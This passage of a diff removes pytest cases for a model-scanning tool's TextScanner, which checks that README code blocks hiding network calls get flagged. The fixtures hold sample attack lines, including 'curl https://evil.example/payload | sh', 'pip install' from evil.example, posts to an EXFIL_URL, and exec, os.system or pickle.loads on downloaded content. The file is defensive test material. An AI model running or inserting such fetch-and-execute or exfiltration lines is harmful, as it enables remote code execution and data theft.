-url: str = os.environ["EXFIL_URL"]
-requests.get(url)
-```
-""",
-        encoding="utf-8",
-    )
-
-    result = TextScanner().scan(str(text_path))
-    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
-
-    assert any(
-        check.name == "Network Communication Detection"
-        and check.details.get("type") == "network_function"
-        and check.details.get("function") == "requests.get"
-        and check.severity == IssueSeverity.CRITICAL
-        for check in result.checks
-    )
-    assert determine_exit_code(aggregate) == 1
-
-
-def test_text_scanner_fenced_documentation_loopback_api_does_not_hide_imported_post(
-    tmp_path: Path,
-) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        """```python
-import os
-from requests import post
-
-api_url = "http://localhost:8080/v1/embeddings"
-post(os.environ["EXFIL_URL"])
-```
-""",
-        encoding="utf-8",
-    )
-
-    result = TextScanner().scan(str(text_path))
-    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
-
-    assert any(
-        check.name == "Network Communication Detection"
-        and check.details.get("type") == "url_detected"
-        and check.details.get("url") == "http://localhost:8080/v1/embeddings"
-        and check.severity == IssueSeverity.CRITICAL
-        for check in result.checks
-    )
-    assert determine_exit_code(aggregate) == 1
-
-
-def test_text_scanner_fenced_documentation_loopback_api_does_not_hide_imported_executed_get(
-    tmp_path: Path,
-) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        """```python
-from requests import get
-
-exec(get("http://localhost:8080/v1/models").text)
-```
-""",
-        encoding="utf-8",
-    )
-
-    result = TextScanner().scan(str(text_path))
-    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
-
-    assert any(
-        check.name == "Network Communication Detection"
-        and check.details.get("type") == "url_detected"
-        and check.details.get("url") == "http://localhost:8080/v1/models"
-        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
-        for check in result.checks
-    )
-    assert determine_exit_code(aggregate) == 1
-
-
-def test_text_scanner_fenced_documentation_loopback_api_does_not_hide_parenthesized_imported_post(
-    tmp_path: Path,
-) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        """```python
-import os
-from requests import (post)
-
-api_url = "http://localhost:8080/v1/embeddings"
-post(os.environ["EXFIL_URL"])
-```
-""",
-        encoding="utf-8",
-    )
-
-    result = TextScanner().scan(str(text_path))
-    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
-
-    assert any(
-        check.name == "Network Communication Detection"
-        and check.details.get("type") == "url_detected"
-        and check.details.get("url") == "http://localhost:8080/v1/embeddings"
-        and check.severity == IssueSeverity.CRITICAL
-        for check in result.checks
-    )
-    assert determine_exit_code(aggregate) == 1
-
-
-def test_text_scanner_fenced_documentation_loopback_api_does_not_hide_multiline_imported_post(
-    tmp_path: Path,
-) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        """```python
-import os
-from requests import (
-    post,
-)
-
-api_url = "http://localhost:8080/v1/embeddings"
-post(os.environ["EXFIL_URL"])
-```
-""",
-        encoding="utf-8",
-    )
-
-    result = TextScanner().scan(str(text_path))
-    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
-
-    assert any(
-        check.name == "Network Communication Detection"
-        and check.details.get("type") == "url_detected"
-        and check.details.get("url") == "http://localhost:8080/v1/embeddings"
-        and check.severity == IssueSeverity.CRITICAL
-        for check in result.checks
-    )
-    assert determine_exit_code(aggregate) == 1
-
-
-def test_text_scanner_fenced_documentation_loopback_api_does_not_hide_module_alias_post(
-    tmp_path: Path,
-) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        """```python
-import os
-import requests as r
-
-api_url = "http://localhost:8080/v1/embeddings"
-r.post(os.environ["EXFIL_URL"])
-```
-""",
-        encoding="utf-8",
-    )
-
-    result = TextScanner().scan(str(text_path))
-    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
-
-    assert any(
-        check.name == "Network Communication Detection"
-        and check.details.get("type") == "network_library"
-        and check.details.get("library") == "requests"
-        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
-        for check in result.checks
-    )
-    assert determine_exit_code(aggregate) == 1
-
-
-def test_text_scanner_fenced_documentation_passive_media_ignores_commented_url_assignment(
-    tmp_path: Path,
-) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        """```python
-import requests
-
-# url = "http://images.cocodataset.org/val2017/000000039769.jpg"
-requests.get(url)
-```
-""",
-        encoding="utf-8",
-    )
-
-    result = TextScanner().scan(str(text_path))
-    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
-
-    assert any(
-        check.name == "Network Communication Detection"
-        and check.details.get("type") == "network_function"
-        and check.details.get("function") == "requests.get"
-        and check.severity == IssueSeverity.CRITICAL
-        for check in result.checks
-    )
-    assert determine_exit_code(aggregate) == 1
-
-
-def test_text_scanner_fenced_documentation_passive_media_ignores_string_url_assignment(
-    tmp_path: Path,
-) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        """```python
-import requests
-
-url = input()
-'''
-url = "http://images.cocodataset.org/val2017/000000039769.jpg"
-'''
-requests.get(url)
-```
-""",
-        encoding="utf-8",
-    )
-
-    result = TextScanner().scan(str(text_path))
-    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
-
-    assert any(
-        check.name == "Network Communication Detection"
-        and check.details.get("type") == "network_function"
-        and check.details.get("function") == "requests.get"
-        and check.severity == IssueSeverity.CRITICAL
-        for check in result.checks
-    )
-    assert determine_exit_code(aggregate) == 1
-
-
-def test_text_scanner_fenced_documentation_passive_media_does_not_hide_bound_session_alias(
-    tmp_path: Path,
-) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        """```python
-import os
-import requests
-
-url = "http://images.cocodataset.org/val2017/000000039769.jpg"
-image = requests.get(url)
-fetch = requests.Session().get
-fetch(os.environ["EXFIL_URL"])
-```
-""",
-        encoding="utf-8",
-    )
-
-    result = TextScanner().scan(str(text_path))
-    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
-
-    assert any(
-        check.name == "Network Communication Detection"
-        and check.details.get("type") == "network_library"
-        and check.details.get("library") == "requests"
-        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
-        for check in result.checks
-    )
-    assert determine_exit_code(aggregate) == 1
-
-
-def test_text_scanner_fenced_documentation_detects_lowercase_session_alias() -> None:
-    fenced_code = b"""
-import os
-import requests
-
-api_url = "http://localhost:8080/v1/embeddings"
-fetch = requests.session().get
-fetch(os.environ["EXFIL_URL"])
-"""
-
-    assert TextScanner._documentation_fenced_has_bound_session_alias_call(fenced_code)
-
-
-def test_text_scanner_fenced_documentation_passive_media_does_not_hide_executed_fetch(
-    tmp_path: Path,
-) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        """```python
-import requests
-
-exec(requests.get("http://images.cocodataset.org/val2017/000000039769.jpg").text)
-```
-""",
-        encoding="utf-8",
-    )
-
-    result = TextScanner().scan(str(text_path))
-    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
-
-    assert any(
-        check.name == "Network Communication Detection"
-        and check.details.get("type") == "network_function"
-        and check.details.get("function") == "requests.get"
-        and check.severity == IssueSeverity.CRITICAL
-        for check in result.checks
-    )
-    assert determine_exit_code(aggregate) == 1
-
-
-def test_text_scanner_fenced_documentation_passive_media_does_not_hide_parenthesized_executed_fetch(
-    tmp_path: Path,
-) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        """```python
-import os
-import requests
-
-os.system((requests.get("http://images.cocodataset.org/val2017/000000039769.jpg")).text)
-```
-""",
-        encoding="utf-8",
-    )
-
-    result = TextScanner().scan(str(text_path))
-    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
-
-    assert any(
-        check.name == "Network Communication Detection"
-        and check.details.get("type") == "network_function"
-        and check.details.get("function") == "requests.get"
-        and check.severity == IssueSeverity.CRITICAL
-        for check in result.checks
-    )
-    assert determine_exit_code(aggregate) == 1
-
-
-def test_text_scanner_fenced_documentation_passive_media_does_not_hide_executed_response(
-    tmp_path: Path,
-) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        """```python
-import requests
-
-resp = requests.get("http://images.cocodataset.org/val2017/000000039769.jpg")
-exec(resp.text)
-```
-""",
-        encoding="utf-8",
-    )
-
-    result = TextScanner().scan(str(text_path))
-    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
-
-    assert any(
-        check.name == "Network Communication Detection"
-        and check.details.get("type") == "network_function"
-        and check.details.get("function") == "requests.get"
-        and check.severity == IssueSeverity.CRITICAL
-        for check in result.checks
-    )
-    assert determine_exit_code(aggregate) == 1
-
-
-def test_text_scanner_fenced_documentation_passive_media_does_not_hide_parenthesized_response_assignment(
-    tmp_path: Path,
-) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        """```python
-import requests
-
-resp = (requests.get("http://images.cocodataset.org/val2017/000000039769.jpg"))
-exec(resp.text)
-```
-""",
-        encoding="utf-8",
-    )
-
-    result = TextScanner().scan(str(text_path))
-    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
-
-    assert any(
-        check.name == "Network Communication Detection"
-        and check.details.get("type") == "network_function"
-        and check.details.get("function") == "requests.get"
-        and check.severity == IssueSeverity.CRITICAL
-        for check in result.checks
-    )
-    assert determine_exit_code(aggregate) == 1
-
-
-def test_text_scanner_fenced_documentation_passive_media_does_not_hide_container_response_execution(
-    tmp_path: Path,
-) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        """```python
-import requests
-
-responses = [requests.get("http://images.cocodataset.org/val2017/000000039769.jpg")]
-exec(responses[0].text)
-```
-""",
-        encoding="utf-8",
-    )
-
-    result = TextScanner().scan(str(text_path))
-    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
-
-    assert any(
-        check.name == "Network Communication Detection"
-        and check.details.get("type") == "network_function"
-        and check.details.get("function") == "requests.get"
-        and check.severity == IssueSeverity.CRITICAL
-        for check in result.checks
-    )
-    assert determine_exit_code(aggregate) == 1
-
-
-def test_text_scanner_fenced_documentation_passive_media_does_not_hide_container_response_alias_execution(
-    tmp_path: Path,
-) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        """```python
-import requests
-
-responses = [requests.get("http://images.cocodataset.org/val2017/000000039769.jpg")]
-body = responses[0].text
-exec(body)
-```
-""",
-        encoding="utf-8",
-    )
-
-    result = TextScanner().scan(str(text_path))
-    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
-
-    assert any(
-        check.name == "Network Communication Detection"
-        and check.details.get("type") == "network_function"
-        and check.details.get("function") == "requests.get"
-        and check.severity == IssueSeverity.CRITICAL
-        for check in result.checks
-    )
-    assert determine_exit_code(aggregate) == 1
-
-
-def test_text_scanner_fenced_documentation_passive_media_container_image_load_is_informational(
-    tmp_path: Path,
-) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        """```python
-from PIL import Image
-import requests
-
-responses = [requests.get("http://images.cocodataset.org/val2017/000000039769.jpg", stream=True)]
-image = Image.open(responses[0].raw)
-```
-""",
-        encoding="utf-8",
-    )
-
-    result = TextScanner().scan(str(text_path))
-    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
-
-    informational_types = {
-        check.details.get("type")
-        for check in result.checks
-        if check.name == "Network Communication Detection" and check.severity == IssueSeverity.INFO
-    }
-    assert {"network_function", "network_library", "url_detected"} <= informational_types
-    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
-    assert determine_exit_code(aggregate) == 0
-
-
-def test_text_scanner_fenced_documentation_imported_get_vetted_variable_url_is_informational(
-    tmp_path: Path,
-) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        """```python
-from requests import get
-
-url = "http://localhost:8080/v1/models"
-response = get(url)
-print(response.status_code)
-```
-""",
-        encoding="utf-8",
-    )
-
-    result = TextScanner().scan(str(text_path))
-    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
-
-    assert any(
-        check.name == "Network Communication Detection"
-        and check.details.get("type") == "url_detected"
-        and check.details.get("url") == "http://localhost:8080/v1/models"
-        and check.severity == IssueSeverity.INFO
-        for check in result.checks
-    )
-    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
-    assert determine_exit_code(aggregate) == 0
-
-
-def test_text_scanner_fenced_documentation_imported_get_vetted_variable_image_load_is_informational(
-    tmp_path: Path,
-) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        """```python
-from PIL import Image
-from requests import get
-
-url = "http://images.cocodataset.org/val2017/000000039769.jpg"
-image = Image.open(get(url, stream=True).raw)
-```
-""",
-        encoding="utf-8",
-    )
-
-    result = TextScanner().scan(str(text_path))
-    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
-
-    informational_types = {
-        check.details.get("type")
-        for check in result.checks
-        if check.name == "Network Communication Detection" and check.severity == IssueSeverity.INFO
-    }
-    assert "url_detected" in informational_types
-    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
-    assert determine_exit_code(aggregate) == 0
-
-
-def test_text_scanner_fenced_documentation_composed_vetted_url_remains_actionable(
-    tmp_path: Path,
-) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        """```python
-import os
-import requests
-
-url = "http://images.cocodataset.org/val2017/000000039769.jpg" + "?api_key=" + os.environ["TOKEN"]
-response = requests.get(url, stream=True)
-```
-""",
-        encoding="utf-8",
-    )
-
-    result = TextScanner().scan(str(text_path))
-    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
-
-    assert any(
-        check.name == "Network Communication Detection"
-        and check.details.get("type") == "network_function"
-        and check.details.get("function") == "requests.get"
-        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
-        for check in result.checks
-    )
-    assert determine_exit_code(aggregate) == 1
-
-
-def test_text_scanner_fenced_documentation_passive_media_does_not_hide_deserialized_response(
-    tmp_path: Path,
-) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        """```python
-import pickle
-import requests
-
-resp = requests.get("http://images.cocodataset.org/val2017/000000039769.jpg")
-pickle.loads(resp.content)
-```
-""",
-        encoding="utf-8",
-    )
-
-    result = TextScanner().scan(str(text_path))
-    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
-
-    assert any(
-        check.name == "Network Communication Detection"
-        and check.details.get("type") == "network_function"
-        and check.details.get("function") == "requests.get"
-        and check.severity == IssueSeverity.CRITICAL
-        for check in result.checks
-    )
-    assert determine_exit_code(aggregate) == 1
-
-
-def test_text_scanner_fenced_documentation_passive_media_does_not_hide_executed_response_alias(
-    tmp_path: Path,
-) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        """```python
-import requests
-
-resp = requests.get("http://images.cocodataset.org/val2017/000000039769.jpg")
-body = resp.text
-exec(body)
-```
-""",
-        encoding="utf-8",
-    )
-
-    result = TextScanner().scan(str(text_path))
-    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
-
-    assert any(
-        check.name == "Network Communication Detection"
-        and check.details.get("type") == "network_function"
-        and check.details.get("function") == "requests.get"
-        and check.severity == IssueSeverity.CRITICAL
-        for check in result.checks
-    )
-    assert determine_exit_code(aggregate) == 1
-
-
-def test_text_scanner_fenced_documentation_passive_media_does_not_hide_chained_executed_response_alias(
-    tmp_path: Path,
-) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        """```python
-import requests
-
-resp = requests.get("http://images.cocodataset.org/val2017/000000039769.jpg")
-body = resp.text
-cmd = body
-exec(cmd)
-```
-""",
-        encoding="utf-8",
-    )
-
-    result = TextScanner().scan(str(text_path))
-    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
-
-    assert any(
-        check.name == "Network Communication Detection"
-        and check.details.get("type") == "network_function"
-        and check.details.get("function") == "requests.get"
-        and check.severity == IssueSeverity.CRITICAL
-        for check in result.checks
-    )
-    assert determine_exit_code(aggregate) == 1
-
-
-def test_text_scanner_fenced_documentation_loopback_api_does_not_hide_imported_response_assignment(
-    tmp_path: Path,
-) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        """```python
-from requests import get
-
-resp = get("http://localhost:8080/v1/models")
-exec(resp.text)
-```
-""",
-        encoding="utf-8",
-    )
-
-    result = TextScanner().scan(str(text_path))
-    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
-
-    assert any(
-        check.name == "Network Communication Detection"
-        and check.details.get("type") == "url_detected"
-        and check.details.get("url") == "http://localhost:8080/v1/models"
-        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
-        for check in result.checks
-    )
-    assert determine_exit_code(aggregate) == 1
-
-
-def test_text_scanner_fenced_documentation_passive_media_does_not_hide_indirect_subprocess_response(
-    tmp_path: Path,
-) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        """```python
-import subprocess
-import requests
-
-resp = requests.get("http://images.cocodataset.org/val2017/000000039769.jpg")
-subprocess.run(["sh", "-c", resp.text])
-```
-""",
-        encoding="utf-8",
-    )
-
-    result = TextScanner().scan(str(text_path))
-    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
-
-    assert any(
-        check.name == "Network Communication Detection"
-        and check.details.get("type") == "network_function"
-        and check.details.get("function") == "requests.get"
-        and check.severity == IssueSeverity.CRITICAL
-        for check in result.checks
-    )
-    assert determine_exit_code(aggregate) == 1
-
-
-def test_text_scanner_fenced_documentation_passive_media_does_not_hide_subprocess_response_alias_argument(
-    tmp_path: Path,
-) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        """```python
-import subprocess
-import requests
-
-resp = requests.get("http://images.cocodataset.org/val2017/000000039769.jpg")
-body = resp.text
-subprocess.run(["sh", "-c", body])
-```
-""",
-        encoding="utf-8",
-    )
-
-    result = TextScanner().scan(str(text_path))
-    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
-
-    assert any(
-        check.name == "Network Communication Detection"
-        and check.details.get("type") == "network_function"
-        and check.details.get("function") == "requests.get"
-        and check.severity == IssueSeverity.CRITICAL
-        for check in result.checks
-    )
-    assert determine_exit_code(aggregate) == 1
-
-
-def test_text_scanner_fenced_documentation_passive_media_does_not_hide_multiline_subprocess_response_alias(
-    tmp_path: Path,
-) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        """```python
-import subprocess
-import requests
-
-resp = requests.get("http://images.cocodataset.org/val2017/000000039769.jpg")
-body = resp.text
-subprocess.run([
-    "sh",
-    "-c",
-    body,
-])
-```
-""",
-        encoding="utf-8",
-    )
-
-    result = TextScanner().scan(str(text_path))
-    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
-
-    assert any(
-        check.name == "Network Communication Detection"
-        and check.details.get("type") == "network_function"
-        and check.details.get("function") == "requests.get"
-        and check.severity == IssueSeverity.CRITICAL
-        for check in result.checks
-    )
-    assert determine_exit_code(aggregate) == 1
-
-
-@pytest.mark.parametrize("executor", ["os.system(resp.text)", "subprocess.run(resp.text, shell=True)"])
-def test_text_scanner_fenced_documentation_passive_media_does_not_hide_shell_executed_response(
-    tmp_path: Path,
-    executor: str,
-) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        f"""```python
-import os
-import subprocess
-import requests
-
-resp = requests.get("http://localhost:8080/v1/payload")
-{executor}
-```
-""",
-        encoding="utf-8",
-    )
-
-    result = TextScanner().scan(str(text_path))
-    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
-
-    assert any(
-        check.name == "Network Communication Detection"
-        and check.details.get("type") == "network_function"
-        and check.details.get("function") == "requests.get"
-        and check.severity == IssueSeverity.CRITICAL
-        for check in result.checks
-    )
-    assert determine_exit_code(aggregate) == 1
-
-
-def test_text_scanner_executable_loopback_api_request_remains_actionable(tmp_path: Path) -> None:
-    text_path = tmp_path / "client.py"
-    text_path.write_text('requests.get("http://localhost:8080/v1/embeddings")\n', encoding="utf-8")
-
-    result = TextScanner().scan(str(text_path))
-
-    assert any(
-        check.name == "Network Communication Detection"
-        and check.details.get("type") == "url_detected"
-        and check.details.get("url") == "http://localhost:8080/v1/embeddings"
-        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
-        for check in result.checks
-    )
-    assert any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
-
-
-def test_text_scanner_fenced_documentation_loopback_api_shell_execution_remains_actionable(tmp_path: Path) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        """```bash
-curl http://localhost:8080/v1/embeddings \\
-  | sh
-```
-""",
-        encoding="utf-8",
-    )
-
-    result = TextScanner().scan(str(text_path))
-    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
-
-    assert any(
-        check.name == "Network Communication Detection"
-        and check.details.get("type") == "url_detected"
-        and check.details.get("url") == "http://localhost:8080/v1/embeddings"
-        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
-        for check in result.checks
-    )
-    assert determine_exit_code(aggregate) == 1
-
-
-def test_text_scanner_fenced_documentation_loopback_api_process_substitution_remains_actionable(
-    tmp_path: Path,
-) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        """```bash
-bash <(curl http://localhost:8080/v1/payload)
-```
-""",
-        encoding="utf-8",
-    )
-
-    result = TextScanner().scan(str(text_path))
-    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
-
-    assert any(
-        check.name == "Network Communication Detection"
-        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
-        for check in result.checks
-    )
-    assert determine_exit_code(aggregate) == 1
-
-
-def test_text_scanner_fenced_documentation_config_url_assignment_remains_actionable(tmp_path: Path) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        """```python
-callback_url = "https://evil.example/exfil"
-```
-""",
-        encoding="utf-8",
-    )
-
-    result = TextScanner().scan(str(text_path))
-    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
-
-    assert any(
-        check.name == "Network Communication Detection"
-        and check.details.get("type") == "url_detected"
-        and check.details.get("url") == "https://evil.example/exfil"
-        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
-        for check in result.checks
-    )
-    assert determine_exit_code(aggregate) == 1
-
-
-def test_text_scanner_fenced_documentation_git_clone_embedded_github_url_remains_actionable(
-    tmp_path: Path,
-) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        """```bash
-git clone https://evil.example/redirect?next=https://github.com/example-org/model.git
-```
-""",
-        encoding="utf-8",
-    )
-
-    result = TextScanner().scan(str(text_path))
-    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
-
-    assert any(
-        check.name == "Network Communication Detection"
-        and check.details.get("type") == "network_command"
-        and check.details.get("command_type") == "git_clone"
-        and check.severity == IssueSeverity.CRITICAL
-        for check in result.checks
-    )
-    assert determine_exit_code(aggregate) == 1
-
-
-def test_text_scanner_fenced_documentation_github_ssh_clone_is_informational(tmp_path: Path) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        """```bash
-git clone git@github.com:example-org/model.git
-```
-""",
-        encoding="utf-8",
-    )
-
-    result = TextScanner().scan(str(text_path))
-    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
-
-    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
-    assert determine_exit_code(aggregate) == 0
-
-
-def test_text_scanner_fenced_documentation_github_clone_does_not_hide_chained_download(
-    tmp_path: Path,
-) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        """```bash
-git clone https://github.com/example-org/model.git && curl https://evil.example/payload
-```
-""",
-        encoding="utf-8",
-    )
-
     result = TextScanner().scan(str(text_path))
-    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
-
-    assert any(
-        check.name == "Network Communication Detection"
-        and check.details.get("type") == "url_detected"
-        and check.details.get("url") == "https://evil.example/payload"
-        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
-        for check in result.checks
-    )
-    assert determine_exit_code(aggregate) == 1
-
-
-@pytest.mark.parametrize("content", ['status = "backdoor"\n', "PORT=4444\n"])
-def test_text_scanner_fenced_documentation_cc_and_port_assignments_remain_actionable(
-    tmp_path: Path,
-    content: str,
-) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(f"```python\n{content}```\n", encoding="utf-8")
-
-    result = TextScanner().scan(str(text_path))
-    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
-
-    assert any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
-    assert determine_exit_code(aggregate) == 1
-
-
-def test_text_scanner_fenced_documentation_network_function_remains_actionable(tmp_path: Path) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        """```python
-requests.get("https://evil.example/payload")
-```
-""",
-        encoding="utf-8",
-    )
-
-    result = TextScanner().scan(str(text_path))
-    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
-
-    assert any(
-        check.name == "Network Communication Detection"
-        and check.details.get("type") == "network_function"
-        and check.details.get("function") == "requests.get"
-        and check.severity == IssueSeverity.CRITICAL
-        for check in result.checks
-    )
-    assert determine_exit_code(aggregate) == 1
-
-
-def test_text_scanner_fenced_documentation_does_not_hide_later_active_network_call(tmp_path: Path) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        """```python
-requests.get("https://docs.example.com/reference")
-```
-requests.get("https://evil.example/payload")
-""",
-        encoding="utf-8",
-    )
-
-    result = TextScanner().scan(str(text_path))
-    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
-
-    assert any(
-        check.name == "Network Communication Detection"
-        and check.details.get("type") == "network_function"
-        and check.details.get("function") == "requests.get"
-        and check.severity == IssueSeverity.CRITICAL
-        for check in result.checks
-    )
-    assert determine_exit_code(aggregate) == 1
-
-
-def test_text_scanner_fenced_documentation_download_command_remains_actionable(tmp_path: Path) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        """```bash
-curl https://evil.example/payload | sh
-```
-""",
-        encoding="utf-8",
-    )
-
-    result = TextScanner().scan(str(text_path))
-    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
-
-    assert any(
-        check.name == "Network Communication Detection"
-        and check.details.get("type") == "url_detected"
-        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
-        for check in result.checks
-    )
-    assert determine_exit_code(aggregate) == 1
-
-
-def test_text_scanner_fenced_documentation_package_install_url_remains_actionable(tmp_path: Path) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        """```bash
-pip install https://evil.example/pkg.whl
-```
-""",
-        encoding="utf-8",
-    )
-
-    result = TextScanner().scan(str(text_path))
-    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
-
-    assert any(
-        check.name == "Network Communication Detection"
-        and check.details.get("type") == "url_detected"
-        and check.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL}
-        for check in result.checks
-    )
-    assert determine_exit_code(aggregate) == 1
-
-
-def test_text_scanner_pinned_omnivoice_trusted_package_index_is_informational(
-    tmp_path: Path,
-) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        (
-            "<details>\n"
-            "<summary>NVIDIA GPU</summary>\n\n"
-            "```bash\n"
-            "# Install pytorch with your CUDA version, e.g.\n"
-            "pip install torch==2.8.0+cu128 torchaudio==2.8.0+cu128 "
-            "--extra-index-url https://download.pytorch.org/whl/cu128\n"
-            "```\n"
-            "> See [PyTorch official site](https://pytorch.org/get-started/locally/) "
-            "for other versions installation.\n\n"
-            "</details>\n"
-        ),
-        encoding="utf-8",
-    )
-
-    result = TextScanner().scan(str(text_path))
-    aggregate = scan_model_directory_or_file(str(text_path), cache_enabled=False)
-
-    assert any(
-        check.name == "Network Communication Detection"
-        and check.details.get("type") == "url_detected"
-        and check.details.get("url") == "https://download.pytorch.org/whl/cu128"
-        and check.severity == IssueSeverity.INFO
-        for check in result.checks
-    )
-    assert any(
-        check.name == "Network Communication Detection"
-        and check.details.get("type") in {"domain", "domain_name"}
-        and check.details.get("domain") == "download.pytorch.org"
-        and check.severity == IssueSeverity.INFO
-        for check in result.checks
-    )
-    assert not any(issue.severity in {IssueSeverity.WARNING, IssueSeverity.CRITICAL} for issue in result.issues)
-    assert determine_exit_code(aggregate) == 0
-
-
-def test_text_scanner_pinned_omnivoice_reporting_limit_with_local_audio_is_informational(
-    tmp_path: Path,
-) -> None:
-    text_path = tmp_path / "README.md"
-    text_path.write_text(
-        (
-            "<!-- k2-fsa/OmniVoice@999c332499c708b116876ff5fe1aa5dd15f422ce -->\n"
-            "# OmniVoice\n\n"
-            '<img src="https://zhu-han.github.io/omnivoice/pics/omnivoice.jpg" />\n'
-            "```bash\n"
-            "pip install torch==2.8.0+cu128 torchaudio==2.8.0+cu128 "
-            "--extra-index-url https://download.pytorch.org/whl/cu128\n"
-            "```\n"
-            "See https://pytorch.org/get-started/locally/ for other versions.\n"
-            "- Model: https://huggingface.co/k2-fsa/OmniVoice\n"
-            "- Space: https://huggingface.co/spaces/k2-fsa/OmniVoice\n"
-            "- Paper: https://huggingface.co/papers/2604.00688\n"
-            "- Repository: https://github.com/k2-fsa/OmniVoice\n"
-            "- Issues: https://github.com/k2-fsa/OmniVoice/issues\n"
-            "```python\n"
-            "from omnivoice import OmniVoice\n"
-            "import soundfile as sf\n"
-            "\n"
